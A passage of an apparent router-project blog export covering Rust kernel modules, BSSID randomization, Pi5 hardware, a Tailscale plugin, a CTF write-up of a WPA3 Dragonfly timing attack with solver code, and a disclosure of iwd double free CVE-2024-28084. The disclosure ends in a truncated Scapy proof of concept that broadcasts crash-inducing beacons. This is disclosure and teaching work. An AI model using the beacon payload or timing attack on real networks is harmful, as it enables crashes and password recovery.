it without doing some weird stuff.\\n    fn linux_version_code() -> core::ffi::c_int;\\n}\\n\\nfn rust_linux_version_code() -> i32 {\\n    unsafe { linux_version_code() }\\n}\\n```\\n\\n:::info\\n\\nThere is already a [ktime abstraction](https://github.com/torvalds/linux/blob/master/rust/kernel/time.rs) written for Rust. I was running 6.9 here, so it wasn\'t available here. That abstraction leverages Rust types to make it more robust, a common theme in abstractions more complex than the ones above.\\n\\n:::\\n\\n\\nRunning the module in a qemu instance:\\n```\\nubuntu@ubuntu-24-cloud-image:~$ ls\\nhelpers.ko  rust_module.ko\\nubuntu@ubuntu-24-cloud-image:~$ uname -r\\n6.9.0\\nubuntu@ubuntu-24-cloud-image:~$ lsmod\\nModule                  Size  Used by\\nubuntu@ubuntu-24-cloud-image:~$ sudo insmod rust_module.ko\\ninsmod: ERROR: could not insert module rust_module.ko: Unknown symbol in module\\nubuntu@ubuntu-24-cloud-image:~$ sudo insmod helpers.ko\\nubuntu@ubuntu-24-cloud-image:~$ sudo insmod rust_module.ko\\nubuntu@ubuntu-24-cloud-image:~$ lsmod\\nModule                  Size  Used by\\nrust_module            12288  0\\nhelpers                12288  1 rust_module\\nubuntu@ubuntu-24-cloud-image:~$ sudo dmesg\\n\\n...\\n\\n[   37.728226] rust_module: loading out-of-tree module taints kernel.\\n[   37.729919] rust_module: Unknown symbol linux_version_code (err -2)\\n[   62.071684] oot_example: Hello from Rust\\n[   62.073836] oot_example: The current time according to C is 62047385799.\\n[   62.074243] oot_example: The current linux version according to C is 395520.\\n```\\n\\nNote that the first time we tried to load the module, it threw an error because our `helpers` module wasn\'t loaded. The second time, it loaded correctly, since it found the `linux_version_code` symbol in our helper module. Additionally, when we ran `lsmod`, we saw that `helpers` was listed as a dependency of `rust_module`.\\n\\nNow, we have an external module written in Rust, but we can make full use of existing C infrastructure even if it\'s not baked into the kernel yet! By leveraging external modules, we can start benefiting from Rust\'s safety features in kernel development without waiting for full mainline support. The rapid development of Rust support in the Linux kernel means that many of these workarounds will become unnecessary over time. As more subsystems gain native Rust abstractions, writing Rust kernel modules will become increasingly straightforward and powerful.\\n\\nThe potential for Rust in the Linux kernel is vast, and we\'re just at the beginning. Whether you\'re a seasoned kernel developer or new to systems programming like I am, now is an exciting time to get involved and contribute to open-source development."},{"id":"bssid-randomization","metadata":{"permalink":"/pages/blog/bssid-randomization","source":"@site/blog/2024-05-31-bssid-randomization.md","title":"BSSID Randomization","description":"How Does WiFi Location Positioning & Tracking Work?","date":"2024-05-31T00:00:00.000Z","tags":[{"inline":true,"label":"wifi positioning","permalink":"/pages/blog/tags/wifi-positioning"},{"inline":true,"label":"privacy","permalink":"/pages/blog/tags/privacy"},{"inline":true,"label":"tracking","permalink":"/pages/blog/tags/tracking"},{"inline":true,"label":"apple","permalink":"/pages/blog/tags/apple"},{"inline":true,"label":"google","permalink":"/pages/blog/tags/google"}],"readingTime":2.26,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"bssid-randomization","title":"BSSID Randomization","authors":["ltsrad"],"tags":["wifi positioning","privacy","tracking","apple","google"]},"unlisted":false,"prevItem":{"title":"Loading Out of Tree Rust in Linux","permalink":"/pages/blog/loading-your-own-rust-kernel-modules"},"nextItem":{"title":"PI5 Hats and More, Unleashing the Power of Modular Router Hardware","permalink":"/pages/blog/pi5-hardware-2024"}},"content":"## How Does WiFi Location Positioning & Tracking Work?\\n\\nAll Apple Smartphones and Laptops as well as Google Devices passively collect Access Point Names (the SSID) and their hardware address (the BSSID), and they then tag it with the GPS location. With billions of customers, tech giants have been able to build databases that contain the physical position of almost every access point in the world.\\n\\nResearchers from the University of Maryland published that the privacy features in the public APIs were insufficient to protect the privacy of individuals.\\n[See the paper from Erik Rye, Dave Levin for the details: \\"Surveilling the Masses with Wi-Fi-Based Positioning Systems\\" ](https://www.cs.umd.edu/~dml/papers/wifi-surveillance-sp24.pdf)\\n\\nKrebs On Security has a through review of the issue: [\\"Why Your Wi-Fi Router Doubles as an Apple AirTag\\"](https://krebsonsecurity.com/2024/05/why-your-wi-fi-router-doubles-as-an-apple-airtag/)\\n\\n\x3c!-- truncate --\x3e\\n\\n## What Is the Impact On Privacy?\\n\\nWhen traveling, access points will reveal their updated location to the general public, who can query the APIs and trick them to reveal location information. It also means that this feature could be used to stalk someone if knowing the SSID and BSSID of their router, to find their new location after they move homes for example. Apple and Google have since added some hardening to help mitigate the attack but the risks still largely remain.\\n\\n## What does this data look like?\\n\\nThe BSSID and SSID data is not private and available in Beacons and Probe Responses, which end up in the data used by Apple and Google to collect positioning information.\\n\\n![image](/img/wireshark-bssid-rand.png)\\n\\n## What is BSSID Randomization?\\n\\nBSSID Randomization is assigning a random MAC address to the Access Point.\\n\\n## Why Enable BSSID Randomization?\\n\\nWhen this happens, the position databases no longer link an access point between locations. The databases can not be queried with only the SSID Name, so the position of the AP will be protected.\\n\\n## Why _nomap Isn\'t Enough ?\\n\\nApple and Google have added a feature, where if the SSID name has \\"_nomap\\" appended in the name, they will not include it in their database. This does not prevent companies that want to collect this information from collecting it anyway. It\'s also unrealistic for users to change their SSID name because they have to reconfigure all of their devices, which is a non-starter for most people with busy lives.\\n\\n## How to Enable BSSID Randomization with SPR ?\\n\\nIn the 3.13 release we have added a UI option to randomize the MAC address on startup. This supports both APs and interfaces working as wireless clients for internet uplink. It will assign a random address using the specified locally administered OUI bit. A user can also pick a common OUI from common-place routers to cloak with instead.\\n\\n![image](/img/bssid-rand.png)\\n\\n\\n\\n\\n\\n##"},{"id":"pi5-hardware-2024","metadata":{"permalink":"/pages/blog/pi5-hardware-2024","source":"@site/blog/2024-05-08-pi-hardware.md","title":"PI5 Hats and More, Unleashing the Power of Modular Router Hardware","description":"Modular Router Hardware","date":"2024-05-08T00:00:00.000Z","tags":[{"inline":true,"label":"pi5","permalink":"/pages/blog/tags/pi-5"},{"inline":true,"label":"raspberry","permalink":"/pages/blog/tags/raspberry"},{"inline":true,"label":"hardware","permalink":"/pages/blog/tags/hardware"}],"readingTime":3.46,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"pi5-hardware-2024","title":"PI5 Hats and More, Unleashing the Power of Modular Router Hardware","authors":["ltsrad"],"tags":["pi5","raspberry","hardware"]},"unlisted":false,"prevItem":{"title":"BSSID Randomization","permalink":"/pages/blog/bssid-randomization"},"nextItem":{"title":"Dragonfly Pake","permalink":"/pages/blog/midnightsun-qualifiers-2024-dragonfly"}},"content":"import LogoPuzzle from \'/static/img/hw/logopuzzle.png\'\\n\\n<div style={{display: \\"flex\\", justifyContent: \\"center\\", alignItems: \\"center\\"}}>\\n  <img src={LogoPuzzle} style={{width: \\"50%\\"}} />\\n</div>\\n\\n## Modular Router Hardware\\n\\nI\'m excited to announce that Supernetworks will be releasing Compute Module based and Pi5 Expansion HAT based access points. The HATs and Compute Modules are expected to be generally available this summer.\\n\\nThe second tenant of Sustainability is Reuse. Companies like [Framework](https://frame.work/) have been spearheading the charge towards a better form of computing by building upgradable laptops and soon other devices.\\n\\nWith what the Raspberry Pi Foundation offers people, we are able to bring some of the benefits of modular computing to Access Points as well. Modularity takes ownership one step further, letting people reuse the hardware for other projects, and upgrade it to make it powerful, without any soldering required.  \\n\\n\x3c!-- truncate --\x3e\\n\\n## Why Raspberry Pis Rock\\n\\nFor us it\'s been easy to admire the Raspberry Pi community in particular. They\'re not perfect, but across the board,\\nthese devices all the way from Wales are highly capable. With the support of the community, Ubuntu, and many other people, software support for them is generally good for quality, security, and keeping current with the innovation that happens on Linux every single day.\\n\\nWhen we started building Supernetworks, people on forums would say PIs even with adapters would be too slow for a router and can\'t push past 100mbps, but we quickly found that to be nonsense, and were able to max out USB3 dongles for speeds over 650 Mbps with WiFi 5 and hit line speed (1Gbps) over the built-in ethernet as well as a USB3 Ethernet adapter. With WiFi 6 dongles, the speeds got even faster. All it took was some IRQ balancing to keep packet processing, USB3, and the built-in ethernet from thrashing the same core on interrupts. The dongles are key because although the PIs have a built-in wifi card, it does not make a great Access Point. At the time the built in card was missing WPA3 support, still has a limited internal antenna, and still today has no support for AP/VLAN for isolation.\\n\\nOne of the key limitations of using only a single USB3 WiFi dongle is that it is single-band. With the PI5 and HATs we can address this.\\n\\n## The PI5 Hats\\n\\nTogether with design firms we\'ve been able to iterate with PI5s to turn them into dual-band/tri-band devices. The Pi5 HATs allow expanding a PI5 with PCI Express to add devices. To fully power Mediatek MT7915/6 cards we needed a custom HAT that could drive more power.\\n\\n![PI5 Hat](/img/hw/pi5hatA.png)\\n\\nThe HATs sit on top of the Pi5 and connect over the GPIO pins for power and the FPC cable for PCI.\\n\\n![PI5 Pod](/img/hw/pi5podpic.jpg)\\n\\n\\nTogether with the MT7916 cards this makes the Pi5 into a highly capable dual-band access point, with one of the bands potentially being 6ghz. With an additional USB dongle it is possible to run the Pi5 as a tri-band router.  We\'ve been able to fully saturate all three bands. It\'s only when a 160Mhz channel is used (with speeds over 1 Gpbs) that we start to see I/O tuning matter for maintaining full bandwidth across USB3 and the mPCIE wifi card simultaneously.\\n\\n## Speed Tests Show Off Pi5 I/O\\n\\nOn the Pi5s we\'re actually seeing the best speeds we\'ve ever seen with the MT7916 cards.\\n\\n![Speed](/img/hw/combospeed.png)\\n\\nNot bad for a package that fits in the palm of your hand.\\n\\nThe image on the left represents a bandwidth test using the built-in ethernet for uplink.\\nThe image on the right represents a bandwidth test with only wifi as the built-in ethernet tops out at 1Gbps.\\n\\nUsing an AX210 card on an intel laptop instead of the iPhone 15, to connect to the Pi5, we\'ve seen 160 MHz connection throughput momentarily top out at 1.9Gbps  over TCP, from close range.\\n\\n## Next Steps\\n\\n\\nThe HAT enables Raspberry Pi 5s to achieve impressive wifi throughput and full coverage for wifi bands. While we scale up production, we\'re also finishing up wifi enclosures. We have an [interest form](https://docs.google.com/forms/d/1rO-MQ1rLbe3qI4wav2FWSNIbFzKI3Md3hMPRY4YPTr8/edit?usp=forms_home&ths=true) if you\'d like to stay posted on updates. You can also [preorder a HAT today](https://www.supernetworks.org/hat.html)"},{"id":"midnightsun-qualifiers-2024-dragonfly","metadata":{"permalink":"/pages/blog/midnightsun-qualifiers-2024-dragonfly","source":"@site/blog/2024-04-22-ctf-dragonfly.md","title":"Dragonfly Pake","description":"Midnight Sun Qualifiers 2024","date":"2024-04-22T00:00:00.000Z","tags":[{"inline":true,"label":"dragonfly","permalink":"/pages/blog/tags/dragonfly"},{"inline":true,"label":"sae","permalink":"/pages/blog/tags/sae"},{"inline":true,"label":"cryptography","permalink":"/pages/blog/tags/cryptography"},{"inline":true,"label":"ctf","permalink":"/pages/blog/tags/ctf"},{"inline":true,"label":"wifi","permalink":"/pages/blog/tags/wifi"}],"readingTime":6.065,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"midnightsun-qualifiers-2024-dragonfly","title":"Dragonfly Pake","authors":["ltsrad"],"tags":["dragonfly","sae","cryptography","ctf","wifi"]},"unlisted":false,"prevItem":{"title":"PI5 Hats and More, Unleashing the Power of Modular Router Hardware","permalink":"/pages/blog/pi5-hardware-2024"},"nextItem":{"title":"SPR Tailscale","permalink":"/pages/blog/spr-tailscale-integration"}},"content":"## Midnight Sun Qualifiers 2024\\n\\nOver the weekend a ctf team I help with, [HackingForSoju](https://hackingforsoju.team/), hosted the Midnight Sun CTF Qualifiers.\\nThe finals will take place in [Stockholm, Sweden on June 14-16](https://conf.midnightsunctf.com/).\\n\\nI put together a [challenge](https://gist.github.com/lts-rad/a557f5eb2d4456bbe209d524bdfbfd23) around WPA3\'s Password Authenticated Key Exchange: [Dragonfly](https://datatracker.ietf.org/doc/html/rfc7664)\\n\\nWPA3 has quite a few notes during our our wifi training where we discuss the background to the protocol, because it was so very worrisome from the start.\\n\\n![trouble](/img/wpa3trouble.png)\\n\\n\x3c!-- truncate --\x3e\\n\\n## A Troubled PAKE\\n\\nIn 2013, when Dan Harkins first proposed Dragonfly many people pointed out that it was\\ninferior to existing PAKEs. Arguably it did not steer clear of existing patents, its performance was quite bad,\\nand very objectively it suffered terribly from sidechannels. It does not take great skill to spot them.\\n\\nThere\'s an IETF thread thread sums it up [here](https://mailarchive.ietf.org/arch/msg/tls/A_SfHI4BsdAi4miklBs3TvUbu-Y/).\\nTrevor Perrin, who is behind the Double Ratchet in Signal designed with Moxie Marlinspike, sums up what cryptographers saw.\\n\\nIn response, Dan Harkins goes on the offensive with personal attacks, saying several things of this nature:\\n\\n```\\n>\\n> It makes little sense to use a 1024-bit FFC group in any circumstances\\n> because (pardon me, Kevin) - fuck the NSA.\\n\\n  That certainly is a fashionable pose to strike these days!\\n\\n  But I brought up binding a 1024-bit FFC to a password because that\'s\\nwhat an RFC with your name on it does. So it makes sense to replace\\n\\"the NSA\\" in your sentence with \\"Trevor Perrin\\".\\n\\n-- Dan Harkins\\n```\\n\\nWhen the designer of a security algorithm finds it acceptable to behave this way,\\nand the decision makers rubber stamp their actions, we should probably take a step back\\nas a society and ask if irrational people should be the ones solving and creating the\\nmath problems that our security relies on.\\n\\nSo when the WiFi consortium used Dragonfly for WPA3 in 2018, many people were actually surprised,\\nsince they assumed Dragonfly would never make its way into widespread usage.\\n\\n## Dragonblood\\n\\nAs WPA3 entered the ecosystem, security experts started looking. In 2019 the world\'s leading wifi security expert,\\nMathy Vanhoef, with Eyal Ronen, demolished Dragonfly [https://wpa3.mathyvanhoef.com](https://wpa3.mathyvanhoef.com/).\\nMany of the attacks were the same as initially outlined by Trevor Perrin as well as many other cryptographers in 2013.\\n\\nThe team also invented some novel mechanisms to attack Brainpool curves in particular. They proved that the\\nhardening attempts with computing random values would provide statistical anomalies detectable by calculating timing variance.\\n\\nWhat\'s even worse, under EAP-PWD (dragonfly with enterprise wifi), they found that implementaitons also accepted invalid curves, bypassing the password altogether.\\n\\nHardening was added to eliminate the remaining sidechannels.\\n\\n## The CTF Challenge\\n\\nThe qualifier\'s challenge celebrates these timing failures.  Players had to remotely exploit a python implementation of Dragonfly\\nthat had the initial hardening only (always running 40 rounds).\\n\\nThe key insight is that the KDF for dragonfly is malleable based on the client\'s MAC address. Providing different MAC addresses\\ncreates unique timing signatures for a given AP MAC address and Password Shared Key.\\n\\nThe timing signature can then be compared offline against a password list to find the real password.\\nWith a vulnerable implementation this timing sidechannel is actually a lot more effective to exploit\\nthan cracking WPA2 keys which are protected with PBKDF2.\\n\\nThe easiest timing differences to exploit are that lines [2] and [3] only happen sometimes.\\n\\n```python\\ndef initiate(self, other_mac, k=40):\\n    \\"\\"\\"\\n    See algorithm in https://tools.ietf.org/html/rfc7664\\n    in section 3.2.1\\n    \\"\\"\\"\\n    self.other_mac = other_mac\\n    found = 0\\n    num_valid_points = 0\\n    counter = 1\\n    n = self.p.bit_length()\\n\\n    # Find x\\n    while counter <= k:\\n        base = self.compute_hashed_password(counter)\\n        temp = self.key_derivation_function(n, base, b\'Dragonfly Hunting And Pecking\')\\n        if temp >= self.p:\\n            counter = counter + 1 [1]\\n            continue\\n        seed = temp\\n        val = self.curve.secure_curve_equation(seed) [2]\\n        if self.curve.secure_is_quadratic_residue(val): [3]\\n            if num_valid_points < 5:\\n                x = seed\\n                save = base\\n                found = 1\\n                num_valid_points += 1\\n                logger.debug(\'Got point after {} iterations\'.format(counter))\\n\\n        counter = counter + 1\\n\\n    if found == 0:\\n        logger.error(\'No valid point found after {} iterations\'.format(k))\\n        return False\\n    elif found == 1:\\n        # https://crypto.stackexchange.com/questions/6777/how-to-calculate-y-value-from-yy-mod-prime-efficiently\\n        # https://rosettacode.org/wiki/Tonelli-Shanks_algorithm\\n        y = tonelli_shanks(self.curve.curve_equation(x), self.p)\\n\\n        PE = Point(x, y)\\n\\n        # check valid point\\n        assert self.curve.curve_equation(x) == pow(y, 2, self.p)\\n\\n        self.PE = PE\\n        assert self.curve.valid(self.PE)\\n        return True\\n```\\n\\nTo expand the timing window, so that players from around the world can exploit this remotely over TCP,\\nmany more multiplications were added through a \\"masking\\" operation where random values are computed\\nalongside the real one at random, raising their cost to hundreds of milliseconds.\\n\\n```python\\ndef secure_curve_equation(self, x):\\n    \\"\\"\\"\\n    Do not leak hamming weights to power analysis\\n    \\"\\"\\"\\n    idx = secrets.randbelow(self.dN)\\n    defense = self.defense_masks + []\\n    defense[idx] = x\\n    for i in range(self.dN):\\n        tmp = defense[idx]\\n        defense[i] = self.curve_equation(defense[idx])\\n    return defense[idx]\\n\\n\\ndef secure_is_quadratic_residue(self, x):\\n    \\"\\"\\"\\n    Do not leak hamming weights to power analysis\\n    \\"\\"\\"\\n    idx = secrets.randbelow(self.dN)\\n    defense = self.defense_masks + []\\n    defense[idx] = x\\n    for i in range(self.dN):\\n        defense[i] = self.is_quadratic_residue(defense[i])\\n    return defense[idx]\\n\\n```\\n\\nIn practice this is good enough for several teams to attack the service simultaneously.\\n\\nTo effectively precompute passwords, an attacker can create an offline dictionary that only hashes and\\nskips the large number math.\\n\\n```python\\ndef initiate(self, other_mac, k=40):\\n    self.other_mac = other_mac\\n    counter = 1\\n    counter2 = 1\\n    n = self.p.bit_length()\\n\\n    # Find x\\n    while counter <= k:\\n        base = self.compute_hashed_password(counter)\\n        temp = self.key_derivation_function(n, base, b\'Dragonfly Hunting And Pecking\')\\n        if temp >= self.p:\\n            counter = counter + 1\\n            continue\\n        counter2 += 1\\n        counter = counter + 1\\n    return counter2\\n```\\n\\n\\nThe provided challenge also had a terrible way to convert a binary number which really slowed things down,\\nand also had an off by one error probably.\\n\\n```python\\n# Convert returned_bits to the non-negative integer c (see Appendix C.2.1).\\nC = 0\\nfor i in range(n):\\n    if int(binary_repr[i]) == 1:\\n        C += pow(2, n-i)\\n```\\nversus\\n```python\\nX = int(binary_repr, 2)<<1\\n```\\n\\nMy solution normalized the remote timings to compare them with the offline compute.\\n\\n```python\\ndef normalize_array(arr):\\n    \\"\\"\\"Normalize an array to be between 0 and 1.\\"\\"\\"\\n    return (arr - arr.min()) / (arr.max() - arr.min())\\n\\ndef calc_mse(psk, timings, guess_timings):\\n    y_actual = normalize_array(np.array(timings))\\n    y_predicted = normalize_array(np.array(guess_timings))\\n    mse = np.mean((y_actual - y_predicted) ** 2)\\n    return mse\\n\\ndef solve_psk_fast(ap_mac, my_macs, timings):\\n    computed = open(\\"compute.txt\\",\\"rb\\").readlines()\\n    psk = None\\n    best_mse = 100\\n    for line in computed:\\n        p, tmp = line.split(b\\"|\\")\\n        p = p.strip().decode()\\n        guess_timings = json.loads(tmp.strip())\\n        mse = calc_mse(p, timings, guess_timings)\\n        if mse < best_mse:\\n            print(\\"new best\\",mse,p)\\n            best_mse = mse\\n            psk = p\\n    print(psk)\\n    return psk\\n```\\n\\n\\n\\n\\nDuring the CTF the services were overwhelmed by naive solutions, so we ended up scaling it up,\\nbut it was a little bit frustrating for some teams at times.  In the future we\'ll have to put remote timing attempts behind a queue and/or proof of work.\\n\\nTo make the challenge harder, teams were also given a second variant with a larger keyspace. Instead of 60k wordlist, they were asked to attack a random 36-alphabet 5 character password. 7 teams solved it. Hats off to the great work, since you understood something Dan Harkins pretended not to when it was explained to him by so many cryptographers.\\n\\n\\n## Links\\n\\nIf you\'d like to learn more about these attacks, the [Dragonblood](https://papers.mathyvanhoef.com/dragonblood.pdf) paper is the one you\'ll want.\\n\\nThe up to date constant time implementation of the password element deriviation in hostapd is located here: [https://w1.fi/cgit/hostap/tree/src/common/sae.c#n283](https://w1.fi/cgit/hostap/tree/src/common/sae.c#n283)."},{"id":"spr-tailscale-integration","metadata":{"permalink":"/pages/blog/spr-tailscale-integration","source":"@site/blog/2024-03-26-spr-tailscale-plugin.md","title":"SPR Tailscale","description":"Introducing SPR-TailScale","date":"2024-03-26T00:00:00.000Z","tags":[{"inline":true,"label":"tailscale","permalink":"/pages/blog/tags/tailscale"},{"inline":true,"label":"wireguard","permalink":"/pages/blog/tags/wireguard"},{"inline":true,"label":"microsegmentation","permalink":"/pages/blog/tags/microsegmentation"},{"inline":true,"label":"vpn","permalink":"/pages/blog/tags/vpn"},{"inline":true,"label":"plugins","permalink":"/pages/blog/tags/plugins"}],"readingTime":1.355,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"spr-tailscale-integration","title":"SPR Tailscale","authors":["ltsrad"],"tags":["tailscale","wireguard","microsegmentation","vpn","plugins"]},"unlisted":false,"prevItem":{"title":"Dragonfly Pake","permalink":"/pages/blog/midnightsun-qualifiers-2024-dragonfly"},"nextItem":{"title":"Beacon Double Free in IWD","permalink":"/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084"}},"content":"## Introducing SPR-TailScale\\n\\nWe\'ve released a new iteration of the [TailScale integration for SPR](https://github.com/spr-networks/spr-tailscale)!\\nThis plugin was put together with [@willy_wong](https://twitter.com/willy_wong).\\n\\n![spr-tailscale](/img/spr-tailscale/combo.png)\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n## Under The Hood\\nGetting this plugin to work in the first place required some thinking.\\nThe first was addressing a key missing feature for SPR: interface-based firewall rules and routing.\\n\\n![firewall-custom-interface-rule-add](/img/guides/firewall-custom-interface-rule-add.png)\\n\\nThis capability lets SPR perform container microsegmentation.  Any interface can be treated this way actually.\\nIt allows for connecting interfaces with policies and groups that SPR has not been explicitly programmed for, as well as providing them API access.\\n\\nThe TailScale plugin sets up its own policy based routing and firewall rules, so being able to run it inside of its own network namespace is ideal.\\nSPR then uses the custom interface rule to route to the container\'s network and let it do the forwarding on its own.\\n\\nNext, setting it up was awkward, painful. To fix this the SPR team added UX for plugins, and the ability to install a plugin via a URL with an OTP code verification. And today we\'ve released this capability for `spr-tailscale`!  It\'s supported from SPR version 0.3.7\\n\\n![spr-tailscale](/img/spr-tailscale/tailscale-ui.png)\\n\\n## What can it do ?\\n\\nThis integration lets SPR devices selectively access TailScale peers. And similarly, TailScale peers can be joined to SPR groups to give them access to SPR devices.\\n\\nThe Plugin presents a React Based UI and simplifies the install. After the install, a user needs to present their Auth Key and they\'re good to go.\\n\\nThe container can run as an exit node as well.\\n\\n## Links\\n\\nYou can check out the [spr-tailscale](https://github.com/spr-networks/spr-tailscale) integration here!"},{"id":"beacon-double-free-inet-wireless-daemon-CVE-2024-28084","metadata":{"permalink":"/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084","source":"@site/blog/2024-03-11-iwd-double-free.md","title":"Beacon Double Free in IWD","description":"CVE-2024-28084 Patched in Inet Wireless Daemon 2.16","date":"2024-03-11T00:00:00.000Z","tags":[{"inline":true,"label":"iwd","permalink":"/pages/blog/tags/iwd"},{"inline":true,"label":"memory-corruption","permalink":"/pages/blog/tags/memory-corruption"},{"inline":true,"label":"wifi","permalink":"/pages/blog/tags/wifi"},{"inline":true,"label":"CVE-2024-28084","permalink":"/pages/blog/tags/cve-2024-28084"}],"readingTime":3,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"beacon-double-free-inet-wireless-daemon-CVE-2024-28084","title":"Beacon Double Free in IWD","authors":["ltsrad"],"tags":["iwd","memory-corruption","wifi","CVE-2024-28084"]},"unlisted":false,"prevItem":{"title":"SPR Tailscale","permalink":"/pages/blog/spr-tailscale-integration"},"nextItem":{"title":"Software Safety Looks Different From The Other Side","permalink":"/pages/blog/federal-focus-memory-corruption-2024"}},"content":"## CVE-2024-28084 Patched in Inet Wireless Daemon 2.16\\n\\nWhile preparing some wifi security training, we found a double free vulnerability affecting\\nAPs and Stations running [`iwd`](https://iwd.wiki.kernel.org/). This issue was reported and [patched](https://git.kernel.org/pub/scm/network/wireless/iwd.git/commit/?id=52a47c9fd428904de611a90cbf8b223af879684d) with fixes available starting in version 2.16.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Supernetworks & Memory Safety\\n\\nWriting secure native code is not simple nor easy. With SPR we\'re striving to build a project that\'s secure by default with memory safety throughout the stack. We\'re continuing to develop a softmac-based solution to eliminate protocol parsing using native code in firmware, drivers and userland. If you\'re interested in joining this effort [let us know](mailto:outreach@supernetworks.org).\\n\\nWe also offer WiFi & Network Security training spanning from Digital Signals Processing to Cryptography to Protocol and Coding safety covering enterprise wifi and WPA2/3. If you\'re interested get in touch at [`training@supernetworks.org`](mailto:trainings@supernetworks.org)\\n\\n## A Double Free With Less Than 30 Bytes\\n\\nThe issue can be triggered remotely by sending a malformed Information Element inside of a beacon, a probe request, or a probe response. These are unauthenticated frames that a malicious attacker with physical proximity can send remotely.\\n\\nThe double free happens while parsing a P2P Information Elements (IEs) with a malformed ADVERTISED_SVC_INFO attribute.\\nIn the context of the flaw, remote double frees are especially powerful as they can lead to information leaks to help bypass ASLR and other hardening measures.\\n\\n![](/img/cve-2024-28084.png)\\n\\n\\n\\nTechnical details are below.\\n\\n\\n### Code Overview\\n\\nUnder `p2p_parse_probe_resp()`, the ADVERTISED_SVC_INFO attribute is captured.\\n\\n\\n```c\\n\\tr = p2p_parse_attrs(pdu, len,\\n\\t\\t\\tREQUIRED(P2P_CAPABILITY, &d.capability),\\n\\t\\t\\tOPTIONAL(EXTENDED_LISTEN_TIMING,\\n\\t\\t\\t\\t\\t&d.listen_availability),\\n\\t\\t\\tOPTIONAL(NOTICE_OF_ABSENCE, &d.notice_of_absence),\\n\\t\\t\\tREQUIRED(P2P_DEVICE_INFO, &d.device_info),\\n\\t\\t\\tOPTIONAL(P2P_GROUP_INFO, &d.group_clients),\\n\\t\\t\\tOPTIONAL(ADVERTISED_SVC_INFO, &d.advertised_svcs),\\n\\t\\t\\t-1);\\n\\n\\tif (r >= 0)\\n\\t\\tmemcpy(out, &d, sizeof(d));\\n\\telse\\n\\t\\tp2p_clear_probe_resp(&d); [1]\\n\\n\\treturn r;\\n}\\n\\n```\\n\\n\\nWhile parsing this attribute in `extract_p2p_advertised_service_info()`, errors in processing will result in the queue pointer allocated at [3] to be released [4]:\\n\\n```c\\nstatic bool extract_p2p_advertised_service_info(const uint8_t *attr, size_t len,\\n\\t\\t\\t\\t\\t\\tvoid *data)\\n{\\n\\tstruct l_queue **out = data;\\n...\\n\\n\\twhile (len) {\\n\\t\\tstruct p2p_advertised_service_descriptor *desc;\\n\\t\\tint name_len;\\n\\n\\t\\tif (len < 7)\\n\\t\\t\\tgoto error;\\n\\n\\t\\tname_len = attr[6];\\n\\t\\tif (len < 7u + name_len)\\n\\t\\t\\tgoto error;\\n\\n\\t\\tif (!l_utf8_validate((const char *) attr + 7, name_len, NULL))\\n\\t\\t\\tgoto error;\\n\\n\\t\\tif (!*out)\\n\\t\\t\\t*out = l_queue_new(); [3]\\n\\n\\nerror:\\n\\tl_queue_destroy(*out, p2p_clear_advertised_service_descriptor); [4]\\n```\\n\\nHowever when the parent function finishes, `p2p_clear_probe_resp()` will also free [2] the `advertised_svcs` data structures.\\n\\n```c\\nvoid p2p_clear_probe_resp(struct p2p_probe_resp *data)\\n{\\n\\tp2p_clear_notice_of_absence_attr(&data->notice_of_absence);\\n\\tp2p_clear_device_info_attr(&data->device_info);\\n\\tp2p_clear_group_info_attr(&data->group_clients);\\n\\tp2p_clear_advertised_service_info_attr(&data->advertised_svcs); [2]\\n}\\n```\\n\\n### Scapy POC\\n\\n\\n```python\\n\\"\\"\\"\\nCVE-2024-28084 beacon double free vulnerability due to error handling in extract_p2p_advertised_service_info\\n\\"\\"\\"\\nimport sys\\nimport os\\nfrom scapy.layers.dot11 import *\\nfrom scapy.arch import str2mac, get_if_raw_hwaddr\\nfrom time import time, sleep\\n\\ndef if_hwaddr(iff):\\n    return str2mac(get_if_raw_hwaddr(iff)[1])\\n\\ndef config_mon(iface, channel):\\n  \\"\\"\\"set the interface in monitor mode and then change channel using iw\\"\\"\\"\\n  os.system(\\"ip link set dev %s down\\" % iface)\\n  os.system(\\"iw dev %s set type monitor\\" % iface)\\n  os.system(\\"ip link set dev %s up\\" % iface)\\n  os.system(\\"iw dev %s set channel %d\\" % (iface, channel))\\n\\nclass AP:\\n    def __init__(self, mac=None, mode=\\"stdio\\", iface=\\"wlan0\\", channel=1):\\n        self.channel = channel\\n        self.iface = iface\\n        self.mode = mode\\n        if self.mode == \\"iface\\":\\n            if not mac:\\n              mac = if_hwaddr(iface)\\n            config_mon(iface, channel)\\n        if not mac:\\n          raise Exception(\\"Need a mac\\")\\n        else:\\n          self.mac = mac\\n\\n    def get_radiotap_header(self):\\n        return RadioTap()\\n\\n    def dot11_beacon(self, bssid):\\n        crash=b\\"\\\\xdd\\\\x07\\" + b\\"\\\\x50\\\\x6f\\\\x9a\\" + b\\"\\\\x09\\"  + b\\"\\\\x19\\\\x08\\\\x00\\" + b\\"\\\\xdd\\\\x10\\" + b\\"\\\\x50\\\\x6f\\\\x9a\\" + b\\"\\\\x09\\" +b\\"\\\\x00\\\\x00\\" + b\\"\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\n        evil_packet = (\\n            self.get_radiotap_header()\\n            / Dot11(\\n                subtype=8, addr1=\\"ff:ff:ff:ff:ff:ff\\", addr2=bssid, addr3=bssid\\n            )\\n            / Dot11Beacon(cap=0x3101)\\n            / crash\\n        )\\n        self.sendp(evil_packet)\\n\\n    def run(self):\\n        self.interval = 0.05\\n        while True:\\n            self.dot11_beacon(self.mac)\\n            # Sleep\\n            sleep(self.interval)\\n        return\\n\\n    def sendp(self, packet, verbose=False):\\n        if self.mode == \\"stdio\\":\\n      